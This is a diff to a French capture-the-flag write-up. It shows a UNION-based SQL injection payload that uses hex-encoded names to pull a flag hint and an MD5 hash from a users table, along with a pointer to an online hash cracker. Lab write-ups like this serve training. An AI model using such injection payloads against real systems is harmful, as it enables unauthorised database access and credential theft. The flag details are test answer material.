@@ -99,12 +99,12 @@ Le flag se trouve dans les colonnes `Commentaire` ou `countersign` de l'utilisat
 - `users` = `0x7573657273`
 - `Flag` = `0x466c6167`
 
-### Obtenir le flag final
-
 **Résultat obtenu** :
+```
 ID: 0 UNION SELECT Commentaire, countersign FROM users WHERE first_name=0x466c6167 
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
+```
 
 Le hash `5ff9d0165b4f92b14994e5c685cdce28` est un hash MD5 qu'il faut décrypter avec https://www.dcode.fr/md5-hash
 
